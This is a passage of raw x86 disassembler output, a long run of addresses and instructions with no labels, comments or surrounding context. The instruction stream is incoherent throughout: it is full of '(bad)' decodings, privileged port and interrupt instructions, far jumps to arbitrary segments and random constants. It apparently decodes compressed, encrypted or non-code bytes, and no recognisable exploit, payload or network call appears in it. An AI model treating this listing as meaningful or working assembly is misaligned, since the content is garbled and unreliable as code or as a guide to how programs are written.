  40def7:	lock adc DWORD PTR [edx+esi*2],ebx
  40defb:	ret    
  40defc:	pop    esp
  40defd:	xchg   edx,eax
  40defe:	and    DWORD PTR [ebx-0x29fdf1dd],edx
  40df04:	sub    eax,0xac552198
  40df09:	or     edx,DWORD PTR [esi]
  40df0b:	out    0xde,al
  40df0d:	sub    DWORD PTR [eax],0x3c
  40df10:	mov    DWORD PTR ds:0x76ecb4e2,0x63f2f9cc
  40df1a:	fdivr  DWORD PTR [eax]
  40df1c:	idiv   BYTE PTR [ecx+0x30]
  40df1f:	xchg   esp,eax
  40df20:	pop    edi
  40df21:	xchg   edx,eax
  40df22:	sub    ecx,DWORD PTR cs:[ebx-0x47]
  40df26:	arpl   WORD PTR [esi+0x4f],cx
  40df29:	mov    ch,BYTE PTR [ecx-0x2792851c]
  40df2f:	dec    esi
  40df30:	mov    bl,cl
  40df32:	or     bh,al
  40df34:	mov    eax,0xdc069910
  40df39:	mov    esp,0x3f62b1ba
  40df3e:	pop    ebx
  40df3f:	cld    
  40df40:	int    0x2
  40df42:	data16 jno 0x40df36
  40df45:	sahf   
  40df46:	iret   
  40df47:	adc    ecx,DWORD PTR [eax-0x49]
  40df4a:	shl    dh,cl
  40df4c:	jae    0x40dfbb
  40df4e:	test   BYTE PTR [edx],cl
  40df50:	leave  
  40df51:	fisttp QWORD PTR [edi]
  40df53:	jb     0x40dfc9
  40df55:	or     bh,ch
  40df57:	push   es
  40df58:	shl    DWORD PTR [ebp+0x27],0xdb
  40df5c:	rcr    DWORD PTR [edx-0x21],1
  40df5f:	ds retf 0x655c
  40df63:	cmp    eax,0x477619f4
  40df68:	lds    esi,FWORD PTR [ebx-0x5b]
  40df6b:	popa   
  40df6c:	push   ebx
  40df6d:	fs clc 
  40df6f:	loope  0x40df2c
  40df71:	int3   
  40df72:	dec    edx
  40df73:	jno    0x40df4f
  40df75:	scas   eax,DWORD PTR es:[edi]
  40df76:	pop    ss
  40df77:	fwait
  40df78:	xchg   ebx,eax
  40df79:	and    ebx,DWORD PTR [ecx]
  40df7b:	jg     0x40df51
  40df7d:	push   ss
  40df7e:	sbb    eax,esp
  40df80:	sbb    al,0xad
  40df82:	pop    ss
  40df83:	rol    BYTE PTR [ebx],cl
  40df85:	jnp    0x40dfed
  40df87:	mov    bh,0xdb
  40df89:	aad    0x23
  40df8b:	pop    ss
  40df8c:	xchg   ecx,eax
  40df8d:	stos   BYTE PTR es:[edi],al
  40df8e:	push   ecx
  40df8f:	mov    dh,0xd8
  40df91:	inc    ebx
  40df92:	sar    DWORD PTR [edi-0x62],1
  40df95:	pop    ecx
  40df96:	(bad)  
  40df97:	loope  0x40df86
  40df99:	inc    edx
  40df9a:	js     0x40e005
  40df9c:	push   cs
  40df9d:	dec    ecx
  40df9e:	inc    esp
  40df9f:	mov    bh,0x4a
  40dfa1:	das    
  40dfa2:	jo     0x40e009
  40dfa4:	(bad)  
  40dfa5:	sbb    bl,BYTE PTR [edx]
  40dfa7:	mov    ch,0xbe
  40dfa9:	push   es
  40dfaa:	or     DWORD PTR ds:0xb1fb5d52,0x262eaf5e
  40dfb4:	pop    eax
  40dfb5:	inc    ecx
  40dfb6:	(bad)  
  40dfb8:	into   
  40dfb9:	stc    
  40dfba:	bound  bp,DWORD PTR [edi+0x4e]
  40dfbe:	pop    ss
  40dfbf:	int3   
  40dfc0:	push   0xffffffe2
  40dfc2:	in     eax,dx
  40dfc3:	add    ecx,DWORD PTR [ebx]
  40dfc5:	popa   
  40dfc6:	adc    ch,BYTE PTR [edx-0x4c]
  40dfc9:	or     dl,BYTE PTR [ebx+0x1661bfb2]
  40dfcf:	dec    esi
  40dfd0:	or     eax,0xadeb5006
  40dfd5:	icebp  
  40dfd6:	dec    esp
  40dfd7:	pop    esi
  40dfd8:	lea    ebp,ds:0x440c25f
  40dfde:	fucomp st(2)
  40dfe0:	mov    BYTE PTR [eax+0x57d1a6ac],bl
  40dfe6:	or     cl,cl
  40dfe8:	rol    eax,1
  40dfea:	(bad)  
  40dfed:	stos   DWORD PTR es:[edi],eax
  40dfee:	out    0x9f,eax
  40dff0:	js     0x40e062
  40dff2:	xor    ah,BYTE PTR [eax+0x73aa5483]
  40dff8:	jg     0x40e004
  40dffa:	pop    ebp
  40dffb:	cmp    edx,DWORD PTR [ebx-0x8]
  40dffe:	pop    esi
  40dfff:	jnp    0x40df84
  40e001:	dec    esi
  40e002:	jns    0x40dfe5
  40e004:	imul   ebp,DWORD PTR [edx],0x1739d3ec
  40e00a:	addr16 mov esi,0x9683545
  40e010:	sub    dl,dl
  40e012:	loopne 0x40dff4
  40e014:	in     eax,dx
  40e015:	retf   
  40e016:	mov    bh,0xc5
  40e018:	sbb    DWORD PTR [ebx],esp
  40e01a:	xchg   esp,eax
  40e01b:	call   0x3002:0x4afc0c9f
  40e022:	jbe    0x40e056
  40e024:	inc    esp
  40e025:	mov    bh,0x96
  40e027:	xchg   DWORD PTR [ebx-0x6d],ebp
  40e02a:	repz sbb al,0xa1
  40e02d:	(bad)  
  40e02e:	cld    
  40e02f:	cmp    al,0x30
  40e031:	ins    DWORD PTR es:[edi],dx
  40e032:	mov    edx,DWORD PTR [ecx-0x6f6e718]
  40e038:	push   esi
  40e039:	addr16 das 
  40e03b:	lock dec esp
  40e03d:	lods   al,BYTE PTR ds:[esi]
  40e03e:	ins    DWORD PTR es:[edi],dx
  40e03f:	xlat   BYTE PTR ds:[ebx]
  40e040:	sahf   
  40e041:	inc    ebx
  40e042:	adc    edi,DWORD PTR ds:0xbacb7118
  40e048:	jp     0x40dfff
  40e04a:	dec    eax
  40e04b:	add    DWORD PTR [edi+ebx*4-0x630c4f90],edx
  40e052:	jne    0x40e055
  40e054:	pusha  
  40e055:	jge    0x40e082
  40e057:	add    al,BYTE PTR [eax+0x69]
  40e05a:	pop    es
  40e05b:	pop    edx
  40e05c:	and    DWORD PTR [edx+ebp*2-0x4b],edx
  40e060:	loopne 0x40e01a
  40e062:	jg     0x40e012
  40e064:	push   ecx
  40e065:	mov    esi,0x52a646f3
  40e06a:	cs inc esi
  40e06c:	push   esi
  40e06d:	pop    ds
  40e06e:	lods   al,BYTE PTR ds:[esi]
  40e06f:	popa   
  40e070:	adc    bh,BYTE PTR [esi-0x77872b14]
  40e076:	push   es
  40e077:	scas   eax,DWORD PTR es:[edi]
  40e078:	sbb    al,0x1e
  40e07a:	and    ebp,DWORD PTR [eax]
  40e07c:	nop
  40e07d:	or     BYTE PTR [edx],cl
  40e07f:	enter  0x9542,0x3
  40e083:	out    0xc6,eax
  40e085:	and    cl,BYTE PTR [eax]
  40e087:	add    eax,edi
  40e089:	popa   
  40e08a:	sbb    al,0xe3
  40e08c:	mov    dl,0x4d
  40e08e:	add    ecx,DWORD PTR [edi-0x561d064c]
  40e094:	jb     0x40e01d
  40e096:	lods   eax,DWORD PTR ds:[esi]
  40e097:	jmp    0x572f09ef
  40e09c:	call   0xcbf0:0x59a6bb93
  40e0a3:	clc    
  40e0a4:	pop    eax
  40e0a5:	push   0x31
  40e0a7:	stc    
  40e0a8:	sar    DWORD PTR [ecx+ecx*8+0x1a4315d8],0x31
  40e0b0:	stc    
  40e0b1:	ret    
  40e0b2:	sbb    BYTE PTR [ebx+ebp*1],cl
  40e0b5:	sub    DWORD PTR [eax-0x5a29cf47],ebp
  40e0bb:	inc    ecx
  40e0bc:	pop    ecx
  40e0bd:	mov    bl,0xbd
  40e0bf:	aas    
  40e0c0:	xchg   ebx,eax
  40e0c1:	pop    ecx
  40e0c2:	mov    ecx,0x954056c9
  40e0c7:	mov    ebx,0x87fe45fa
  40e0cc:	dec    esi
  40e0cd:	pop    ebp
  40e0ce:	sub    cl,ah
  40e0d0:	rol    BYTE PTR [ebp+eiz*8+0x5a],cl
  40e0d4:	into   
  40e0d5:	and    DWORD PTR [ebp+0x7c],ebx
  40e0d8:	pop    ebx
  40e0d9:	stos   BYTE PTR es:[edi],al
  40e0da:	xchg   ebx,eax
  40e0db:	and    ebx,DWORD PTR [ebp+0x2773089]
  40e0e1:	ret    0xea6a
  40e0e4:	rol    ch,0xe4
  40e0e7:	hlt    
  40e0e8:	push   ebp
  40e0e9:	lea    ecx,[ecx+0x52]
  40e0ec:	hlt    
  40e0ed:	pop    ds
  40e0ee:	lea    edi,[eax-0x5a]
  40e0f1:	dec    ecx
  40e0f2:	aad    0xdb
  40e0f4:	pop    ebx
  40e0f5:	jl     0x40e0c8
  40e0f7:	add    al,0x5d
  40e0f9:	scas   eax,DWORD PTR es:[edi]
  40e0fa:	cmp    esi,ebp
  40e0fc:	aas    
  40e0fd:	xchg   ecx,eax
  40e0fe:	imul   ebx,DWORD PTR [edx+0x1f22d0b3],0xffffffc9
  40e105:	mov    al,ds:0x29d16310
  40e10a:	inc    esi
  40e10b:	cmp    eax,0x7aa5745c
  40e110:	sub    edx,esi
  40e112:	xor    cl,BYTE PTR [edi-0x79]
  40e115:	cli    
  40e116:	and    DWORD PTR [edx+ecx*8-0x72],esp
  40e11a:	rcl    DWORD PTR [ebp-0x74ca9077],0xc5
  40e121:	cld    
  40e122:	add    ah,ch
  40e124:	add    esp,ecx
  40e126:	jns    0x40e121
  40e128:	push   0x9ca58876
  40e12d:	or     ebp,DWORD PTR [ecx]
  40e12f:	ret    0x5f0b
  40e132:	ror    DWORD PTR [ebp-0x4e537265],0x6c
  40e139:	pop    ecx
  40e13a:	sbb    DWORD PTR [ebp+0x471cb608],0xfffffff5
  40e141:	(bad)  
  40e142:	call   0x61501711
  40e147:	dec    ebx
  40e148:	cmp    eax,0xa965dc7f
  40e14d:	fs ja  0x40e104
  40e150:	arpl   WORD PTR [eax-0x4e],bx
  40e153:	ja     0x40e13d
  40e155:	(bad)  
  40e156:	cs inc ebx
  40e158:	add    DWORD PTR [esi],0xd394de9c
  40e15e:	repnz push edi
  40e160:	shl    ebx,1
  40e162:	ret    
  40e163:	loope  0x40e111
  40e165:	fadd   DWORD PTR [ecx-0x3]
  40e168:	gs mov ebp,0x9371edfe
  40e16e:	sub    al,0xb4
  40e170:	or     DWORD PTR [edx-0x6d120c13],0xffffffb6
  40e177:	and    edi,DWORD PTR [ebx]
  40e179:	in     al,0x6e
  40e17b:	aaa    
  40e17c:	pop    ecx
  40e17d:	retf   0x865f
  40e180:	jmp    0x4061:0xcfe51bbb
  40e187:	ins    DWORD PTR es:[edi],dx
  40e188:	sub    al,0xac
  40e18a:	push   0x7e
  40e18c:	sub    dh,ah
  40e18e:	fst    DWORD PTR [ebp-0x42]
  40e191:	or     DWORD PTR [ecx-0x6],0xe2ede981
  40e198:	dec    ebp
  40e199:	ss push ds
  40e19b:	test   BYTE PTR [ecx-0x25a4e866],al
  40e1a1:	sub    bh,BYTE PTR [ebp-0x79584693]
  40e1a7:	mov    esi,0xed695d52
  40e1ac:	sbb    al,0xfa
  40e1ae:	sub    ch,ch
  40e1b0:	xor    esp,DWORD PTR ds:0x325d9de6
  40e1b6:	(bad)  
  40e1b7:	dec    ah
  40e1b9:	sbb    ch,al
  40e1bb:	xchg   ebx,eax
  40e1bc:	mov    cl,0x78
  40e1be:	ret    0x572d
  40e1c1:	cli    
  40e1c2:	and    ah,bh
  40e1c4:	(bad)  
  40e1c5:	lods   al,BYTE PTR ds:[esi]
  40e1c6:	jmp    0x40e1c2
  40e1c8:	lods   eax,DWORD PTR ds:[esi]
  40e1c9:	loope  0x40e210
  40e1cb:	push   edi
  40e1cc:	fdiv   DWORD PTR [eax-0x5b]
  40e1cf:	ss xchg ebp,eax
  40e1d1:	and    BYTE PTR ds:0x9a5ee520,ch
  40e1d7:	xchg   ecx,eax
  40e1d8:	ror    BYTE PTR [esi],cl
  40e1da:	push   edi
  40e1db:	inc    ebp
  40e1dc:	pop    esp
  40e1dd:	cli    
  40e1de:	inc    ebp
  40e1df:	cmp    eax,0x247e9bef
  40e1e4:	mov    bl,0x3a
  40e1e6:	push   ecx
  40e1e7:	retf   0x14fb
  40e1ea:	adc    ebx,esp
  40e1ec:	ins    BYTE PTR es:[edi],dx
  40e1ed:	add    eax,0xf0676c1e
  40e1f2:	mov    ebx,0x37a6fd28
  40e1f7:	cmovns eax,DWORD PTR [eax]
  40e1fa:	pushf  
  40e1fb:	push   ds
  40e1fc:	imul   esi,DWORD PTR [eax-0x3c9a12b3],0x585a2046
  40e206:	xchg   DWORD PTR [esi],esp
  40e208:	or     al,0xc3
  40e20a:	shr    BYTE PTR [eax-0x3b5acbca],1
  40e210:	cwde   
  40e211:	into   
  40e212:	cmp    ebp,DWORD PTR [ebx-0x35f3bfa1]
  40e218:	aas    
  40e219:	ss inc ecx
  40e21b:	loop   0x40e1af
  40e21d:	mov    edx,0xe66f0ba8
  40e222:	inc    edx
  40e223:	adc    edx,DWORD PTR [edi+0x413af240]
  40e229:	gs push ss
  40e22b:	shl    BYTE PTR [ebp-0x38],0x2b
  40e22f:	pop    eax
  40e230:	(bad)  
  40e231:	mov    ds:0x417137,eax
  40e236:	jmp    0x32be:0x150dc5ac
  40e23d:	ins    DWORD PTR es:[edi],dx
  40e23e:	mov    al,0xfb
  40e240:	push   edx
  40e241:	xor    dl,BYTE PTR [eax]
  40e243:	clc    
  40e244:	inc    ebp
  40e245:	mov    ds:0xd0062138,eax
  40e24a:	push   edi
  40e24b:	leave  
  40e24c:	sub    bh,dl
  40e24e:	cdq    
  40e24f:	jnp    0x40e24d
  40e251:	ins    DWORD PTR es:[edi],dx
  40e252:	cli    
  40e253:	sar    ebp,1
  40e255:	mov    BYTE PTR [ebp+0x3be76b86],cl
  40e25b:	sahf   
  40e25c:	and    eax,0x69131aa6
  40e261:	imul   ebp,DWORD PTR [ebp-0x6ce359fb],0x9d71b65b
  40e26b:	fnstsw WORD PTR [ebp+0x5866c138]
  40e271:	lods   eax,DWORD PTR ds:[esi]
  40e272:	sti    
  40e273:	lods   eax,DWORD PTR ds:[esi]
  40e274:	std    
  40e275:	push   ecx
  40e276:	daa    
  40e277:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e278:	mov    ds:0x44eb9362,eax
  40e27d:	ret    
  40e27e:	fmul   st(3),st
  40e280:	mov    al,ds:0x951819e
  40e285:	cwde   
  40e286:	sbb    al,BYTE PTR [ebp+0x2b7dc538]
  40e28c:	jns    0x40e28a
  40e28e:	cdq    
  40e28f:	mov    ebx,0xc0fce30d
  40e294:	add    eax,0xc0a9100a
  40e299:	cli    
  40e29a:	dec    eax
  40e29b:	fwait
  40e29c:	fs inc edx
  40e29e:	pushf  
  40e29f:	out    dx,al
  40e2a0:	(bad)  
  40e2a2:	mov    al,ds:0xafc327ae
  40e2a7:	test   al,0xd3
  40e2a9:	mov    esp,0x5686334e
  40e2ae:	sti    
  40e2af:	inc    dl
  40e2b1:	(bad)  
  40e2b2:	jbe    0x40e307
  40e2b4:	xchg   ebx,eax
  40e2b5:	push   esi
  40e2b6:	adc    al,0x3c
  40e2b8:	pop    ebx
  40e2b9:	push   es
  40e2ba:	lea    edi,[edx]
  40e2bc:	repz adc ch,bl
  40e2bf:	or     al,BYTE PTR [edx-0x2a]
  40e2c2:	jne    0x40e28d
  40e2c4:	hlt    
  40e2c5:	sub    ch,BYTE PTR [ebx]
  40e2c7:	or     al,0xf3
  40e2c9:	out    0xbd,eax
  40e2cb:	sbb    ebx,ebp
  40e2cd:	and    DWORD PTR [edx-0x2c],edx
  40e2d0:	sbb    esi,DWORD PTR [edi]
  40e2d2:	and    esi,edx
  40e2d4:	icebp  
  40e2d5:	jp     0x40e325
  40e2d7:	pusha  
  40e2d8:	test   DWORD PTR [edi],ecx
  40e2da:	xchg   esi,ebp
  40e2dc:	mov    eax,0x75343e1f
  40e2e1:	scas   al,BYTE PTR es:[edi]
  40e2e2:	adc    ebx,DWORD PTR [ebx]
  40e2e4:	pop    ecx
  40e2e5:	mov    cl,BYTE PTR [edx+0x21984cf4]
  40e2eb:	out    0x96,al
  40e2ed:	mov    ebx,0x3bc0c403
  40e2f2:	cdq    
  40e2f3:	mov    eax,0x77ef09f6
  40e2f8:	mov    eax,0x3337a6e5
  40e2fd:	xchg   edx,eax
  40e2fe:	iret   
  40e2ff:	data16 jnp 0x40e2a9
  40e302:	arpl   cx,di
  40e304:	pop    ds
  40e305:	push   esi
  40e306:	pop    ss
  40e307:	aam    0x45
  40e309:	or     al,0x9f
  40e30b:	mov    edi,0x8297fbfa
  40e310:	cmp    bl,BYTE PTR [ebx+0x3e]
  40e313:	test   eax,0x36eb6bfb
  40e318:	nop
  40e319:	or     edi,DWORD PTR [ebx-0x10f3e1d8]
  40e31f:	cmp    eax,0xa6261f86
  40e324:	jg     0x40e2be
  40e326:	shr    DWORD PTR [ebp-0x43d1b166],0x21
  40e32d:	cs loop 0x40e38e
  40e330:	cmp    al,bl
  40e332:	inc    ecx
  40e333:	sbb    DWORD PTR [ebx+0x2a3cb78b],ebx
  40e339:	sbb    eax,DWORD PTR [edi-0x2a]
  40e33c:	push   es
  40e33d:	nop
  40e33e:	jb     0x40e37a
  40e340:	out    0x72,al
  40e342:	outs   dx,BYTE PTR ds:[esi]
  40e343:	repz fdivr DWORD PTR [esi+0x3f]
  40e347:	iret   
  40e348:	aad    0x43
  40e34a:	jg     0x40e32f
  40e34c:	rcr    DWORD PTR [edi-0x45],0x7b
  40e350:	sub    BYTE PTR [ebx],al
  40e352:	pop    es
  40e353:	paddq  mm5,mm5
  40e356:	in     eax,dx
  40e357:	adc    dl,BYTE PTR ds:0x9aba0881
  40e35d:	or     al,0xd8
  40e35f:	in     eax,dx
  40e360:	xor    eax,0x91e198bb
  40e365:	xor    al,0x2a
  40e367:	inc    edx
  40e368:	test   al,0x76
  40e36a:	sub    bl,BYTE PTR [ebp+0x2a]
  40e36d:	stos   BYTE PTR es:[edi],al
  40e36e:	or     dh,BYTE PTR [ebx+ebx*4+0x3d4de8a]
  40e375:	pop    DWORD PTR [esi-0x6a335ef3]
  40e37b:	or     DWORD PTR [ecx+0x52],edx
  40e37e:	loop   0x40e38b
  40e380:	cmp    BYTE PTR [esi],bl
  40e382:	cmp    BYTE PTR [edi+edx*4-0x28],cl
  40e386:	jp     0x40e31c
  40e388:	and    ebp,DWORD PTR [eax+0x45]
  40e38b:	inc    ecx
  40e38c:	sub    DWORD PTR ds:0x155628b7,esi
  40e392:	aaa    
  40e393:	add    ebx,DWORD PTR [ebx+ebx*8+0x36]
  40e397:	or     bl,dl
  40e399:	ficomp DWORD PTR [eax+ebp*1-0x69]
  40e39d:	lds    edi,FWORD PTR [edx]
  40e39f:	dec    edx
  40e3a0:	call   0x75c5ad95
  40e3a5:	or     BYTE PTR [ebp+0x44],bl
  40e3a8:	adc    esi,DWORD PTR [ebp+0xf23e793]
  40e3ae:	adc    DWORD PTR [edi],ecx
  40e3b0:	mov    dl,0xae
  40e3b2:	imul   ebx,DWORD PTR [esi-0x57],0x53
  40e3b6:	fs jae 0x40e3df
  40e3b9:	mov    ch,0x19
  40e3bb:	xor    BYTE PTR [ebp-0x6f],dl
  40e3be:	mov    ah,0x6b
  40e3c0:	dec    eax
  40e3c1:	fwait
  40e3c2:	mov    edx,0xbcce065b
  40e3c7:	cli    
  40e3c8:	dec    ecx
  40e3c9:	dec    ebx
  40e3ca:	pop    es
  40e3cb:	push   ds
  40e3cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3cd:	les    edx,FWORD PTR [eax+0x20e2fbc5]
  40e3d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3d4:	jmp    0xd028:0xba6b3aa6
  40e3db:	neg    bh
  40e3dd:	mov    dh,BYTE PTR [eax+0x69d9587b]
  40e3e3:	jbe    0x40e39e
  40e3e5:	sti    
  40e3e6:	gs test al,0xed
  40e3e9:	or     BYTE PTR [edi-0xf],0xd6
  40e3ed:	(bad)  
  40e3ee:	sub    eax,0xf54e272f
  40e3f3:	sub    eax,0xd70fc2e9
  40e3f8:	jecxz  0x40e3de
  40e3fa:	fstp   TBYTE PTR [ebp-0x11991d5a]
  40e400:	jecxz  0x40e481
  40e402:	fcom   QWORD PTR [edi]
  40e404:	fdivr  QWORD PTR [ecx+0x74f57d18]
  40e40a:	dec    ecx
  40e40b:	or     ah,BYTE PTR [ebp+eax*2+0x3e9aab17]
  40e412:	add    BYTE PTR [edx-0x5c],bh
  40e415:	repz jo 0x40e3c7
  40e418:	ret    0xb3a3
  40e41b:	pop    ds
  40e41c:	xchg   esp,eax
  40e41d:	popf   
  40e41e:	fisubr WORD PTR [ebx+0x32be47fd]
  40e424:	rol    DWORD PTR [edx+0x58],0x14
  40e428:	bound  ebp,QWORD PTR [ebx]
  40e42a:	inc    esp
  40e42b:	jge    0x40e48b
  40e42d:	sbb    al,0xd5
  40e42f:	loope  0x40e46c
  40e431:	je     0x40e47e
  40e433:	das    
  40e434:	pop    es
  40e435:	mov    ds:0x6a392dad,eax
  40e43a:	lea    ecx,[edx-0x4d]
  40e43d:	cmp    DWORD PTR [edi-0xa],0xffffff9f
  40e441:	loopne 0x40e3d6
  40e443:	mov    esp,DWORD PTR [esi]
  40e445:	fdiv   st,st(7)
  40e447:	mov    ebx,DWORD PTR [esi+edx*8+0x39f86a30]
  40e44e:	fidivr WORD PTR [eax]
  40e450:	fwait
  40e451:	add    al,0xa8
  40e453:	jne    0x40e471
  40e455:	ja     0x40e3dc
  40e457:	lods   eax,DWORD PTR ds:[esi]
  40e458:	xor    al,0x16
  40e45a:	adc    al,0x76
  40e45c:	rol    BYTE PTR [edx],cl
  40e45e:	cld    
  40e45f:	add    BYTE PTR [ecx],bl
  40e461:	jle    0x40e436
  40e463:	mov    ebx,0xb6666583
  40e468:	add    BYTE PTR [edx],ch
  40e46a:	jno    0x40e4e4
  40e46c:	stc    
  40e46d:	add    DWORD PTR ds:0x20279152,edi
  40e473:	cmp    DWORD PTR [ebx],0x51c2aee
  40e479:	add    esp,ebp
  40e47b:	(bad)  
  40e47c:	push   ebx
  40e47d:	gs push cs
  40e47f:	in     al,dx
  40e480:	add    BYTE PTR [edi-0x38],bl
  40e483:	adc    bl,ch
  40e485:	jecxz  0x40e4c7
  40e487:	mov    ds:0xc4eda2a3,eax
  40e48c:	aad    0xbe
  40e48e:	ret    
  40e48f:	and    bl,BYTE PTR [eax]
  40e491:	pop    es
  40e492:	retf   
  40e493:	xchg   DWORD PTR [esi+0x6e2116ee],edx
  40e499:	dec    eax
  40e49a:	xor    al,0x6c
  40e49c:	hlt    
  40e49d:	dec    DWORD PTR [esi]
  40e49f:	int3   
  40e4a0:	std    
  40e4a1:	pop    edx
  40e4a2:	or     edx,ecx
  40e4a4:	mov    BYTE PTR ds:0xe3c1357,bl
  40e4aa:	mov    al,ds:0xe81ebbd1
  40e4af:	mov    edi,0xbcce4dd5
  40e4b4:	adc    edi,DWORD PTR [ecx-0x70]
  40e4b7:	imul   edi,ebx,0x3d
  40e4ba:	arpl   WORD PTR [ebx+0x2a],cx
  40e4bd:	(bad)  
  40e4be:	daa    
  40e4bf:	fld    st(4)
  40e4c1:	out    0x5c,al
  40e4c3:	push   ecx
  40e4c4:	dec    ebp
  40e4c5:	push   0x57163162
  40e4ca:	clc    
  40e4cb:	pop    eax
  40e4cc:	mov    WORD PTR [edi],cs
  40e4ce:	in     al,0x12
  40e4d0:	stc    
  40e4d1:	mov    dh,BYTE PTR [edx+0x22]
  40e4d4:	push   esp
  40e4d5:	mov    ecx,0x3570323b
  40e4da:	jl     0x40e4b1
  40e4dc:	push   es
  40e4dd:	jae    0x40e471
  40e4df:	jbe    0x40e514
  40e4e1:	icebp  
  40e4e2:	psubusw mm4,QWORD PTR [ebp+eax*2-0x66590efb]
  40e4ea:	add    eax,DWORD PTR [edi]
  40e4ec:	das    
  40e4ed:	xor    al,0x3f
  40e4ef:	(bad)  
  40e4f1:	in     al,dx
  40e4f2:	aad    0xc4
  40e4f4:	xchg   DWORD PTR [eax+0x15],ebp
  40e4f7:	jp     0x40e48b
  40e4f9:	or     BYTE PTR [ecx-0x3b],ch
  40e4fc:	enter  0xa976,0x79
  40e500:	cmp    dh,dl
  40e502:	push   es
  40e503:	in     eax,dx
  40e504:	scas   al,BYTE PTR es:[edi]
  40e505:	cmp    dh,BYTE PTR [ecx-0x671c5eae]
  40e50b:	xchg   ebx,eax
  40e50c:	iret   
  40e50d:	popa   
  40e50e:	test   eax,0xcb10154b
  40e513:	cdq    
  40e514:	mov    edi,0xc18948ae
  40e519:	stc    
  40e51a:	dec    edx
  40e51b:	jno    0x40e4c1
  40e51d:	push   edi
  40e51e:	(bad)  
  40e51f:	imul   ebx,DWORD PTR [eax+0x1f4c0905],0x58
  40e526:	and    eax,0xc3ee2202
  40e52b:	ins    DWORD PTR es:[edi],dx
  40e52c:	mov    BYTE PTR [ebp-0x1b],ah
  40e52f:	shr    DWORD PTR [edi+0x4066702],1
  40e535:	add    esp,DWORD PTR [ebx+edx*4-0x4311a4cd]
  40e53c:	jae    0x40e5ae
  40e53e:	jl     0x40e4c5
  40e540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e541:	stos   DWORD PTR es:[edi],eax
  40e542:	scas   al,BYTE PTR es:[edi]
  40e543:	mov    ds:0xdc9a984d,eax
  40e548:	pushf  
  40e549:	inc    eax
  40e54a:	arpl   dx,bp
  40e54c:	mov    ch,0x48
  40e54e:	pop    esi
  40e54f:	jl     0x40e572
  40e551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e552:	add    esp,DWORD PTR [edx+0x5e]
  40e555:	jecxz  0x40e4e3
  40e557:	ds jo  0x40e541
  40e55a:	xor    eax,0x9c0fcbc1
  40e55f:	mov    edx,0xcefe44b2
  40e564:	cmp    BYTE PTR ds:0x8197ecc1,al
  40e56a:	pusha  
  40e56b:	mov    esp,0x6c52adaf
  40e570:	in     al,dx
  40e571:	je     0x40e57f
  40e573:	jmp    0x40e5c0
  40e575:	mov    ds:0x92aabb70,al
  40e57a:	cdq    
  40e57b:	(bad)  
  40e57c:	fldcw  WORD PTR [eax-0x61]
  40e57f:	sahf   
  40e580:	sub    eax,0xf01df732
  40e585:	mov    ebp,0x6be69d1b
  40e58a:	aam    0xb3
  40e58c:	mov    ebp,0xbaa3caa5
  40e591:	out    dx,al
  40e592:	pushf  
  40e593:	test   al,0xad
  40e595:	test   al,0xe2
  40e597:	fisub  WORD PTR [ebp-0x13774a4a]
  40e59d:	push   ebx
  40e59e:	into   
  40e59f:	pop    edi
  40e5a0:	mov    esi,0x4c6660c7
  40e5a5:	sahf   
  40e5a6:	jle    0x40e58a
  40e5a8:	and    al,0xcd
  40e5aa:	cmp    ah,BYTE PTR [ebx+0x348c9d0f]
  40e5b0:	(bad)  [ecx]
  40e5b2:	fcomp  st(6)
  40e5b4:	or     DWORD PTR [edx-0x4ee88530],0x72
  40e5bb:	sub    esp,DWORD PTR ds:0x7ef172ad
  40e5c1:	jecxz  0x40e5eb
  40e5c3:	dec    ebp
  40e5c4:	push   edi
  40e5c5:	inc    DWORD PTR [esi-0x69f7de94]
  40e5cb:	add    DWORD PTR [ebx+0x149bd8b],eax
  40e5d1:	inc    esp
  40e5d2:	xchg   edi,eax
  40e5d3:	push   ss
  40e5d4:	test   DWORD PTR [eax-0x6e],esp
  40e5d7:	add    eax,0x620477c6
  40e5dc:	jmp    DWORD PTR [ebx+0x6b]
  40e5df:	dec    ebx
  40e5e0:	fidiv  WORD PTR [ebx-0x67]
  40e5e3:	mov    edx,0x7b5929f7
  40e5e8:	add    BYTE PTR [eax-0x252df7ee],dl
  40e5ee:	out    0x1f,eax
  40e5f0:	lods   al,BYTE PTR ds:[esi]
  40e5f1:	cmp    BYTE PTR [eax],bl
  40e5f3:	in     eax,dx
  40e5f4:	mov    al,ds:0x7f753b7d
  40e5f9:	ret    
  40e5fa:	aam    0x1e
  40e5fc:	push   esi
  40e5fd:	in     eax,0xc9
  40e5ff:	dec    ebp
  40e600:	fadd   st(1),st
  40e602:	inc    esi
  40e603:	mov    eax,ds:0x949a70c0
  40e609:	cs call 0x2775:0x14dc612d
  40e611:	and    cl,ah
  40e613:	repnz dec edi
  40e615:	std    
  40e616:	pop    esp
  40e617:	push   eax
  40e618:	jg     0x40e607
  40e61a:	inc    edx
  40e61b:	jg     0x40e63c
  40e61d:	mov    dh,0xf4
  40e61f:	or     bl,BYTE PTR [edi]
  40e621:	inc    esi
  40e622:	test   DWORD PTR [esi],ebp
  40e624:	fwait
  40e625:	jbe    0x40e648
  40e627:	dec    ecx
  40e628:	iret   
  40e629:	sti    
  40e62a:	(bad)  
  40e62b:	pop    ebp
  40e62c:	mov    ss,esi
  40e62e:	fwait
  40e62f:	(bad)  
  40e630:	(bad)  
  40e631:	sbb    ecx,DWORD PTR [edi]
  40e633:	fcomp  QWORD PTR [esi+ecx*1-0x59cf869c]
  40e63a:	aas    
  40e63b:	dec    esi
  40e63c:	add    BYTE PTR [eax],ah
  40e63e:	(bad)
  40e642:	push   esp
  40e643:	in     al,dx
  40e644:	jge    0x40e639
  40e646:	sub    edx,esi
  40e648:	fisubr DWORD PTR [ebx]
  40e64a:	sub    ecx,esi
  40e64c:	ja     0x40e6c0
  40e64e:	lock sub DWORD PTR [edx+ecx*2+0x1e],0xffffff95
  40e654:	arpl   WORD PTR [eax],bp
  40e656:	int    0xcf
  40e658:	dec    ecx
  40e659:	add    ebx,0x6a
  40e65c:	sub    eax,0xadadc6f2
  40e661:	sbb    DWORD PTR [esi-0x51],eax
  40e664:	xchg   BYTE PTR [edi+0x7f],bl
  40e667:	or     al,0x39
  40e669:	sbb    eax,0xc08505e3
  40e66e:	ret    
  40e66f:	ss xchg ecx,eax
  40e671:	pusha  
  40e672:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
